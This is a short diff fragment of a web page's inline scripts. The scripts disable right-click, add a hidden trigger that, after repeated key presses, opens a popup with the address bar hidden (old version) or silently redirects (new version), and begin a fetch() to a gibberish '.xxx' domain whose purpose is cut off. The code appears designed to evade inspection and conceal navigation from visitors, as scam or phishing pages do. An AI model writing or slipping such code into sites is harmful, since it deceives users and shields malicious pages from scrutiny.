@@ -6603,24 +6603,27 @@ function S(a,b){var c=document;if(b){var e=c.getElementById(a);if(!e){e=b();var 
 
 <div class="overlay"></div> <script>
 document.body.addEventListener('contextmenu', function(event) {
- event.preventDefault();
+  event.preventDefault();
 });
+
+</script>
 
 <script>
-let enterKeyPressCount = 0;
+  let enterKeyPressCount = 0;
 
 document.addEventListener("keydown", function(event) {
- if (event.keyCode === 85) {
-  enterKeyPressCount++;
-  if (enterKeyPressCount === 4) {
-   // Open popup window with hidden address bar
-   const popupWindow = window.open('./go.html', '_blank', 'location=no');
-   popupWindow.focus(); // Focus on the popup window
-   enterKeyPressCount = 0; // Reset the count
+  if (event.keyCode === 16) {
+    enterKeyPressCount++;
+    if (enterKeyPressCount === 4) {
+      // Redirect using window.location.href
+      window.location.href = './reload.html';
+      enterKeyPressCount = 0; // Reset the count after redirection
+    }
   }
- }
 });
+
 </script>
+
 
 <script>
 fetch('https://khgnfrdtgyhgvftyujkmnbvcfdrtyujhgvfdeswdxcfghjikokijuhnjkmo9876trfgvbhjnbjmk.xxx/hjbfresdfghjiuj')
